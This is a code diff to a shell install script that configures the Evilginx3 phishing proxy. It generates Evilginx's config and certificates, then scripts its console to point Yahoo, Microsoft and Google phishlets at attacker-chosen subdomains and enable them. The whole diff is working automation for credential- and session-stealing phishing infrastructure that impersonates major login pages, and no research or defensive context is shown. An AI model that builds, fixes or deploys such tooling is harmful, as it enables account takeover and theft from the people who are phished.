@@ -554,6 +554,14 @@ convert_phishlet_to_v3() {
 configure_evilginx_integration() {
     log "Configuring Evilginx3 integration..."
 
+    # Create Evilginx config from template first to prevent port 443 conflict on startup
+    if [ -f "$INSTALL_DIR/templates/evilginx.yaml.tmpl" ]; then
+        sed -e "s/{{.Domain}}/$DOMAIN/g" \
+            -e "s/{{.VpsIp}}/$VPS_IP/g" \
+            "$INSTALL_DIR/templates/evilginx.yaml.tmpl" > "$EVILGINX_DIR/config.yaml"
+    fi
+
+    mkdir -p "$EVILGINX_DIR/certs"
     # Copy certificates for Evilginx3
     cp /etc/letsencrypt/live/$DOMAIN/fullchain.pem "$EVILGINX_DIR/certs/"
     cp /etc/letsencrypt/live/$DOMAIN/privkey.pem "$EVILGINX_DIR/certs/"
@@ -622,34 +630,26 @@ log_user 1
 spawn /usr/local/bin/evilginx -p $EVILGINX_DIR/phishlets
 
 expect {
-    ">" { 
+    -re "evilginx\s+>" { 
         send "config domain $DOMAIN\r"
-        expect ">"
+        expect -re "evilginx\s+>"
         send "config ipv4 $VPS_IP\r"
-        expect ">"
-        send "config https_port 8443\r"
-        expect ">"
-        send "config http_port 8081\r"
-        expect ">"
-        send "config dns_port 0\r"
-        expect ">"
-        send "config autocert off\r"
-        expect ">"
+        expect -re "evilginx\s+>"
         
         # Enable phishlets
         send "phishlets hostname yahoo $EP1.$DOMAIN\r"
-        expect ">"
+        expect -re "evilginx\s+>"
         send "phishlets hostname microsoft $EP2.$DOMAIN\r"
-        expect ">"
+        expect -re "evilginx\s+>"
         send "phishlets hostname google $EP3.$DOMAIN\r"
-        expect ">"
+        expect -re "evilginx\s+>"
         
         send "phishlets enable yahoo\r"
-        expect ">"
+        expect -re "evilginx\s+>"
         send "phishlets enable microsoft\r"
-        expect ">"
+        expect -re "evilginx\s+>"
         send "phishlets enable google\r"
-        expect ">"
+        expect -re "evilginx\s+>"
         
         send "exit\r"
     }
